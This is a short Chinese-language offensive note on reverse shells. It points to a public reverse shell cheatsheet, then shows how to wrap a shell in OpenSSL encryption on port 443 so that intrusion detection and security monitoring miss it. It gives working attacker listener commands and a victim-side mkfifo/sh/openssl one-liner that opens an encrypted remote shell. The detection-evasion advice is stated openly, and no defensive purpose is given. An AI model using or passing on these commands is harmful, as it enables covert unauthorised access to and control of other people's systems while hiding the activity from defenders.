

### 反弹shell的各种方法

适用于不同系统(windows/linux) 不同语言环境(python/node/Java/Golang...)

直接参考 [PayloadsAllTheThings/Reverse Shell Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp)

⚠️因为没有使用加密通信 所以各防御系统(IDS/IPS/SOC...)能够从通信流量中获取明文传输的通信数据(命令字符串)!

### 加密通信 - 使用OpenSSL实现加密通信

使用加密通信，能够避免"通信数据"被轻易检测

因为SSL/TLS加密通信流量常见于443端口,所以建议使用443端口进行通信(避免在不常见端口使用 导致告警)

```shell
# hacker
hacker@kali$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
hacker@kali$ openssl s_server -quiet -key key.pem -cert cert.pem -port 443
or
hacker@kali$ ncat --ssl -vv -l -p 443


# victim
user@company$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 127.0.0.1:443 > /tmp/s; rm /tmp/s
```
